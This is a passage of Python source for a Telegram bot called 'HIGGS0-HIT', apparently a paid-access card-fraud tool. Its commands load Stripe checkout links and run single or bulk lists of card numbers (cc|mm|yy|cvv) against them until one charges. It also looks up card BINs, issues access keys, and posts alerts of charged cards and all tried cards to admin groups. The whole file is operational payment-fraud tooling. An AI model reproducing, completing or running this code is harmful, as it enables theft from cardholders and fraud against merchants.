        f"{D} <b>TOTAL</b>      :: <code>{len(all_u)}</code>\n"
        f"{D} <b>AUTHORIZED</b> :: <code>{authed}</code>\n"
        f"{D} <b>PENDING</b>    :: <code>{len(all_u) - authed - banned}</code>\n"
        f"{D} <b>BANNED</b>     :: <code>{banned}</code>\n\n"
        f"<b>[ KEYS ]</b>\n"
        f"{D} <b>TOTAL</b>    :: <code>{len(all_k)}</code>\n"
        f"{D} <b>ACTIVE</b>   :: <code>{len(all_k) - used_k}</code>\n"
        f"{D} <b>REDEEMED</b> :: <code>{used_k}</code>\n\n"
        f"<b>[ SYSTEM ]</b>\n"
        f"{D} <b>UPTIME</b>    :: <code>{uptime // 60}m {uptime % 60}s</code>\n"
        f"{D} <b>LOG GROUP</b> :: <code>{_log_group_id or 'NOT SET'}</code>\n"
        f"{D} <b>BOT</b>       :: <code>HIGGS0-HIT v1.0</code>\n\n{L}",
        parse_mode=ParseMode.HTML
    )

async def cmd_broadcast(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text(denied_msg(), parse_mode=ParseMode.HTML); return
    text = " ".join(ctx.args or "").strip()
    if not text:
        await update.message.reply_text("<b>⚠️ Usage:</b> <code>/broadcast Your message</code>", parse_mode=ParseMode.HTML); return
    sent = failed = 0
    for u in users.values():
        if u.is_authorized:
            try:
                await ctx.bot.send_message(
                    chat_id=u.telegram_id,
                    text=f"{L}\n<b>  📢 BROADCAST</b>\n{L}\n\n{text}\n\n{L}",
                    parse_mode=ParseMode.HTML
                )
                sent += 1
            except Exception:
                failed += 1
    await update.message.reply_text(
        f"{L}\n<b>  📢 BROADCAST SENT</b>\n{L}\n\n"
        f"{D} <b>SENT</b>   :: <code>{sent}</code>\n"
        f"{D} <b>FAILED</b> :: <code>{failed}</code>\n\n{L}",
        parse_mode=ParseMode.HTML
    )

async def cmd_setloggroup(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text(denied_msg(), parse_mode=ParseMode.HTML); return
    chat_id = str(update.effective_chat.id)
    set_log_group(chat_id)
    await update.message.reply_text(
        f"{L}\n<b>  ✅ LOG GROUP SET</b>\n{L}\n\n"
        f"{D} <b>CHAT ID</b> :: <code>{chat_id}</code>\n"
        f"{D} <b>STATUS</b>  :: 🟢 <b>ACTIVE</b>\n\n"
        f"<i>Charge logs will now be dropped here.</i>\n\n{L}",
        parse_mode=ParseMode.HTML
    )

async def cmd_testlog(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text(denied_msg(), parse_mode=ParseMode.HTML); return
    if not _log_group_id:
        await update.message.reply_text(
            f"{L}\n<b>⚠️ NO LOG GROUP SET</b>\n{L}\n\n"
            f"<i>Add the bot to the group as admin, then run /setloggroup inside it.</i>\n\n{L}",
            parse_mode=ParseMode.HTML
        ); return
    test_msg = (
        f"𝐒𝐭𝐚𝐭𝐮𝐬: 𝐏𝐚𝐢𝐝 ✅\n"
        f"𝐌𝐞𝐬𝐬𝐚𝐠𝐞: 9.99 USD 𝐂𝐡𝐚𝐫𝐠𝐞𝐝\n"
        f"𝐒𝐢𝐭𝐞: TEST MERCHANT (testmerchant.com)\n"
        f"𝐔𝐬𝐞𝐫: @{update.effective_user.username or 'admin'}"
    )
    try:
        await ctx.bot.send_message(chat_id=_log_group_id, text=test_msg)
        await update.message.reply_text(
            f"{L}\n<b>  ✅ TEST LOG SENT</b>\n{L}\n\n"
            f"{D} <b>GROUP</b> :: <code>{_log_group_id}</code>\n\n{L}",
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        await update.message.reply_text(
            f"{L}\n<b>❌ SEND FAILED</b>\n{L}\n\n<code>{e}</code>\n\n"
            f"<i>Make sure the bot is admin in the group.</i>\n\n{L}",
            parse_mode=ParseMode.HTML
        )

async def cmd_setchargegroup(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text(denied_msg(), parse_mode=ParseMode.HTML); return
    chat_id = str(update.effective_chat.id)
    set_charge_group(chat_id)
    await update.message.reply_text(
        f"{L}\n<b>  ✅ CHARGE ALERT GROUP SET</b>\n{L}\n\n"
        f"{D} <b>CHAT ID</b> :: <code>{chat_id}</code>\n"
        f"{D} <b>STATUS</b>  :: 🟢 <b>ACTIVE</b>\n\n"
        f"<i>Full charge alerts (card + amount + all tried) will now be dropped here.</i>\n\n{L}",
        parse_mode=ParseMode.HTML
    )

async def cmd_testcharge(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text(denied_msg(), parse_mode=ParseMode.HTML); return
    if not _charge_group_id:
        await update.message.reply_text(
            f"{L}\n<b>⚠️ NO CHARGE GROUP SET</b>\n{L}\n\n"
            f"<i>Add the bot as admin in your group, then run /setchargegroup inside it.</i>\n\n{L}",
            parse_mode=ParseMode.HTML
        ); return
    test_msg = (
        f"{L}\n<b>🔔 CHARGE ALERT</b>\n{L}\n\n"
        f"{D} <b>MERCHANT</b> :: TEST MERCHANT (testmerchant.com)\n"
        f"{D} <b>AMOUNT</b>   :: <code>9.99 USD</code>\n"
        f"{D} <b>USER</b>     :: <code>@{update.effective_user.username or 'admin'}</code>"
        f" (<code>{update.effective_user.id}</code>)\n\n"
        f"<b>✅ CHARGED CARD:</b>\n  <code>4111111111111111|01|26|123</code>\n\n"
        f"<b>📋 ALL TRIED [2]:</b>\n"
        f"  ❌ <code>4000000000000002|01|26|123</code>\n"
        f"  ✅ <code>4111111111111111|01|26|123</code>\n\n"
        f"{L}\n<b>Gateway:</b> Stripe Co (Beta)\n<b>Dev:</b> Zangi"
    )
    try:
        await ctx.bot.send_message(chat_id=_charge_group_id, text=test_msg, parse_mode=ParseMode.HTML)
        await update.message.reply_text(
            f"{L}\n<b>  ✅ TEST CHARGE ALERT SENT</b>\n{L}\n\n"
            f"{D} <b>GROUP</b> :: <code>{_charge_group_id}</code>\n\n{L}",
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        await update.message.reply_text(
            f"{L}\n<b>❌ SEND FAILED</b>\n{L}\n\n<code>{e}</code>\n\n"
            f"<i>Make sure the bot is admin in the group.</i>\n\n{L}",
            parse_mode=ParseMode.HTML
        )

# ─── HITTER COMMANDS ──────────────────────────────────────────────────────────

async def cmd_hit(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    f = update.effective_user
    if not await is_authorized(f.id):
        await update.message.reply_text(
            f"{L}\n<b>⛔ ACCESS DENIED</b>\n{L}\n<i>Use /usekey to activate access.</i>",
            parse_mode=ParseMode.HTML); return
    raw = " ".join(ctx.args or "").strip()
    if not raw:
        await update.message.reply_text(
            "<b>⚠️ Usage:</b> <code>/hit https://checkout.stripe.com/...</code>",
            parse_mode=ParseMode.HTML); return
    msg = await update.message.reply_text(f"{L}\n<b>⏳ LOADING CHECKOUT...</b>\n{L}", parse_mode=ParseMode.HTML)
    result = await init_checkout(raw)
    if isinstance(result, dict) and "error" in result:
        await msg.edit_text(
            f"{L}\n<b>❌ INIT FAILED</b>\n{L}\n\n{D} <code>{result['error']}</code>\n\n{L}",
            parse_mode=ParseMode.HTML); return
    uid = str(f.id); user_sessions[uid] = result
    price_str = f"{result.price} {result.currency or ''}" if result.price is not None else "N/A"
    await msg.edit_text(
        f"{L}\n<b>  ✅ CHECKOUT LOADED</b>\n{L}\n\n"
        f"{D} <b>MERCHANT</b> :: <code>{result.merchant or 'N/A'}</code>\n"
        f"{D} <b>PRICE</b>    :: <code>{price_str}</code>\n"
        f"{D} <b>EMAIL</b>    :: <code>{result.email or 'N/A'}</code>\n"
        f"{D} <b>PK</b>       :: <code>{result.pk[:24]}...</code>\n\n"
        f"<i>Use /chk [card] to charge.\nUse /mhit [url] for bulk mode.</i>\n\n{L}",
        parse_mode=ParseMode.HTML
    )

async def cmd_chk(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    f = update.effective_user
    if not await is_authorized(f.id):
        await update.message.reply_text(f"{L}\n<b>⛔ ACCESS DENIED</b>\n{L}", parse_mode=ParseMode.HTML); return
    uid = str(f.id); session = user_sessions.get(uid)
    if not session:
        await update.message.reply_text(
            f"{L}\n<b>⚠️ NO SESSION LOADED</b>\n{L}\n\n"
            f"<i>Use /hit [url] to load a checkout first.</i>\n\n{L}",
            parse_mode=ParseMode.HTML); return
    cc = " ".join(ctx.args or "").strip()
    if not cc:
        await update.message.reply_text(
            "<b>⚠️ Usage:</b> <code>/chk 4111111111111111|01|26|123</code>",
            parse_mode=ParseMode.HTML); return
    if not parse_card(cc):
        await update.message.reply_text(
            f"{L}\n<b>❌ INVALID FORMAT</b>\n{L}\n<code>{cc}</code>\n\n"
            f"<i>Expected: cc|mm|yy|cvv</i>\n\n{L}",
            parse_mode=ParseMode.HTML); return
    loading = await update.message.reply_text(
        f"{L}\n<b>⚡ CHARGING...</b>\n{L}\n<code>{cc}</code>", parse_mode=ParseMode.HTML)
    res = await charge_card(cc, session)
    await loading.edit_text(fmt_result(res, session), parse_mode=ParseMode.HTML)
    if res["status"] == "CHARGED":
        user_info = {"id": f.id, "username": f.username}
        asyncio.create_task(send_charge_alert(
            ctx.application, user_info, res["card"],
            [{"card": res["card"], "status": "CHARGED"}], session
        ))
        asyncio.create_task(send_group_log(ctx.application, user_info, res, session))

async def cmd_bin(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    f = update.effective_user
    if not await is_authorized(f.id):
        await update.message.reply_text(f"{L}\n<b>⛔ ACCESS DENIED</b>\n{L}", parse_mode=ParseMode.HTML); return
    bin_arg = re.sub(r"\D", "", " ".join(ctx.args or "").strip())
    if len(bin_arg) < 6:
        await update.message.reply_text("<b>⚠️ Usage:</b> <code>/bin 411111</code>", parse_mode=ParseMode.HTML); return
    info = await lookup_bin(bin_arg)
    await update.message.reply_text(
        f"{L}\n<b>  🔎 BIN LOOKUP</b>\n{L}\n\n"
        f"{D} <b>BIN</b>     :: <code>{info['bin']}</code>\n"
        f"{D} <b>BRAND</b>   :: <code>{info['brand']}</code>\n"
        f"{D} <b>TYPE</b>    :: <code>{info['type']}</code>\n"
        f"{D} <b>LEVEL</b>   :: <code>{info['level']}</code>\n"
        f"{D} <b>BANK</b>    :: <code>{info['bank']}</code>\n"
        f"{D} <b>COUNTRY</b> :: <code>{info['country']} {info['flag']}</code>\n\n{L}",
        parse_mode=ParseMode.HTML
    )

async def cmd_mhit(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    f = update.effective_user
    if not await is_authorized(f.id):
        await update.message.reply_text(f"{L}\n<b>⛔ ACCESS DENIED</b>\n{L}", parse_mode=ParseMode.HTML); return
    raw = " ".join(ctx.args or "").strip()
    if not raw:
        await update.message.reply_text(
            "<b>⚠️ Usage:</b> <code>/mhit https://checkout.stripe.com/...</code>",
            parse_mode=ParseMode.HTML); return
    loading = await update.message.reply_text(f"{L}\n<b>⏳ LOADING CHECKOUT...</b>\n{L}", parse_mode=ParseMode.HTML)
    result = await init_checkout(raw)
    if isinstance(result, dict) and "error" in result:
        await loading.edit_text(
            f"{L}\n<b>❌ INIT FAILED</b>\n{L}\n\n{D} <code>{result['error']}</code>\n\n{L}",
            parse_mode=ParseMode.HTML); return
    uid = str(f.id)
    user_sessions[uid] = result
    bulk_mode_users.add(uid)
    bulk_stats[uid] = BulkStats()
    price_str = f"{result.price} {result.currency or ''}" if result.price is not None else "N/A"
    await loading.edit_text(
        f"{L}\n<b>  ⚡ BULK MODE ACTIVE</b>\n{L}\n\n"
        f"{D} <b>MERCHANT</b> :: <code>{result.merchant or 'N/A'}</code>\n"
        f"{D} <b>PRICE</b>    :: <code>{price_str}</code>\n\n"
        f"<i>Send cards one per line: <code>cc|mm|yy|cvv</code>\nType /stop to end session.</i>\n\n{L}",
        parse_mode=ParseMode.HTML
    )

async def cmd_stop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = str(update.effective_user.id)
    if uid not in bulk_mode_users:
        await update.message.reply_text(f"{L}\n<b>ℹ️ NO ACTIVE BULK SESSION</b>\n{L}", parse_mode=ParseMode.HTML); return
    st = bulk_stats.get(uid, BulkStats())
    bulk_mode_users.discard(uid); bulk_stats.pop(uid, None)
    await update.message.reply_text(
        f"{L}\n<b>  🛑 BULK SESSION ENDED</b>\n{L}\n\n"
        f"{D} <b>TOTAL</b>    :: <code>{st.total}</code>\n"
        f"{D} <b>CHARGED</b>  :: <code>{st.charged}</code>\n"
        f"{D} <b>DECLINED</b> :: <code>{st.declined}</code>\n"
        f"{D} <b>3DS</b>      :: <code>{st.tds}</code>\n"
        f"{D} <b>FAILED</b>   :: <code>{st.failed}</code>\n\n{L}",
        parse_mode=ParseMode.HTML
    )

# ─── TEXT HANDLER (bulk mode) ─────────────────────────────────────────────────

async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid  = str(update.effective_user.id)
    text = update.message.text.strip()

    if uid not in bulk_mode_users or text.startswith("/"):
        if text.startswith("/"):
            await update.message.reply_text(
                f"{L}\n<b>❓ UNKNOWN COMMAND</b>\n{L}\n<i>Use /help for the command list.</i>",
                parse_mode=ParseMode.HTML
            )
        return

    session = user_sessions.get(uid)
    if not session:
        bulk_mode_users.discard(uid)
        await update.message.reply_text(
            f"{L}\n<b>⚠️ SESSION EXPIRED</b>\n{L}\n<i>Use /mhit to start a new session.</i>",
            parse_mode=ParseMode.HTML); return

    lines         = [l.strip() for l in text.split("\n") if l.strip()]
    valid_lines   = [l for l in lines if parse_card(l)]
    invalid_lines = [l for l in lines if not parse_card(l)]
    total         = len(valid_lines)
    stats         = bulk_stats.get(uid, BulkStats())

    if total == 0:
        await update.message.reply_text(
            f"{L}\n<b>⚠️ NO VALID CARDS</b>\n{L}\n<i>Expected format: cc|mm|yy|cvv</i>",
            parse_mode=ParseMode.HTML); return

    placeholder = await update.message.reply_text(
        f"{L}\n<b>⚡ STARTING — {total} CARD{'S' if total > 1 else ''}</b>\n{L}",
        parse_mode=ParseMode.HTML
    )

    result_blocks = []
    tried_cards   = []
    for inv in invalid_lines:
        result_blocks.append(f"⚠️ <b>INVALID</b> :: <code>{inv}</code>")

    stopped = False; stop_reason = ""

    for i, line in enumerate(valid_lines):
        try:
            await placeholder.edit_text(
                f"{L}\n<b>⚡ [{i+1}/{total}] CHECKING...</b>\n{L}\n\n"
                f"<code>{line}</code>\n\n"
                f"✅ <code>{stats.charged}</code> · ❌ <code>{stats.declined}</code> · 🔐 <code>{stats.tds}</code>",
                parse_mode=ParseMode.HTML
            )
        except Exception:
            pass

        res = await charge_card(line, session)
        stats.total += 1
        tried_cards.append({"card": res["card"], "status": res["status"]})
        bulk_stats[uid] = stats

        if res["status"] == "CHARGED":
            stats.charged += 1
            result_blocks.append(fmt_result(res, session))
            user_info = {"id": update.effective_user.id, "username": update.effective_user.username}
            asyncio.create_task(send_charge_alert(ctx.application, user_info, res["card"], tried_cards, session))
            asyncio.create_task(send_group_log(ctx.application, user_info, res, session))
            stopped = True; stop_reason = "charged"; break

        if res["status"] == "DECLINED" and is_checkout_dead(res["response"]):
            stats.declined += 1
            result_blocks.append(fmt_result(res, session))
            stopped = True; stop_reason = "dead"; break

        if res["status"] == "DECLINED": stats.declined += 1
        elif res["status"] == "3DS":    stats.tds += 1
        else:                           stats.failed += 1
        result_blocks.append(fmt_result(res, session))

    footer = (
        f"\n{L}\n"
        f"📊 <b>BATCH</b> | ✅ <code>{stats.charged}</code> · ❌ <code>{stats.declined}</code> "
        f"· 🔐 <code>{stats.tds}</code> · ⚠️ <code>{stats.failed}</code>"
    )
    if stopped and stop_reason == "charged":
        footer += "\n<b>🛑 STOPPED — Payment successful</b>"
        bulk_mode_users.discard(uid); bulk_stats.pop(uid, None)
    elif stopped and stop_reason == "dead":
        footer += "\n<b>🛑 STOPPED — Checkout expired/completed</b>"
        bulk_mode_users.discard(uid); bulk_stats.pop(uid, None)

    combined = "\n\n".join(result_blocks) + footer
    MAX = 4000
    try:
        if len(combined) <= MAX:
            await placeholder.edit_text(combined, parse_mode=ParseMode.HTML)
        else:
            await placeholder.delete()
            chunk = ""
            for i, block in enumerate(result_blocks):
                nxt = (chunk + "\n\n" + block) if chunk else block
                if len(nxt) > MAX:
                    if chunk: await update.message.reply_text(chunk, parse_mode=ParseMode.HTML)
                    chunk = block
                else:
                    chunk = nxt
                if i == len(result_blocks) - 1 and chunk:
                    await update.message.reply_text(chunk + footer, parse_mode=ParseMode.HTML)
    except Exception:
        await update.message.reply_text(combined[:MAX], parse_mode=ParseMode.HTML)

# ─── MAIN ─────────────────────────────────────────────────────────────────────

_start_time = time.time()

def main():
    print(f"HIGGS0-HIT v1.0 — starting...")
    print(f"Log group: {_log_group_id or 'NOT SET (use /setloggroup in group)'}")

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start",        cmd_start))
    app.add_handler(CommandHandler("help",         cmd_help))
    app.add_handler(CommandHandler("id",           cmd_id))
    app.add_handler(CommandHandler("status",       cmd_status))
    app.add_handler(CommandHandler("usekey",       cmd_usekey))
    app.add_handler(CommandHandler("auth",         cmd_auth))
    app.add_handler(CommandHandler("deauth",       cmd_deauth))
    app.add_handler(CommandHandler("ban",          cmd_ban))
    app.add_handler(CommandHandler("unban",        cmd_unban))
    app.add_handler(CommandHandler("genkey",       cmd_genkey))
    app.add_handler(CommandHandler("genkeys",      cmd_genkeys))
    app.add_handler(CommandHandler("keys",         cmd_keys))
    app.add_handler(CommandHandler("delkey",       cmd_delkey))
    app.add_handler(CommandHandler("users",        cmd_users))
    app.add_handler(CommandHandler("info",         cmd_info))
    app.add_handler(CommandHandler("stats",        cmd_stats))
    app.add_handler(CommandHandler("broadcast",    cmd_broadcast))
    app.add_handler(CommandHandler("setloggroup",    cmd_setloggroup))
    app.add_handler(CommandHandler("setchargegroup", cmd_setchargegroup))
    app.add_handler(CommandHandler("testlog",        cmd_testlog))
    app.add_handler(CommandHandler("testcharge",     cmd_testcharge))
    app.add_handler(CommandHandler("hit",          cmd_hit))
    app.add_handler(CommandHandler("chk",          cmd_chk))
    app.add_handler(CommandHandler("bin",          cmd_bin))
    app.add_handler(CommandHandler("mhit",         cmd_mhit))
    app.add_handler(CommandHandler("stop",         cmd_stop))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))

    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
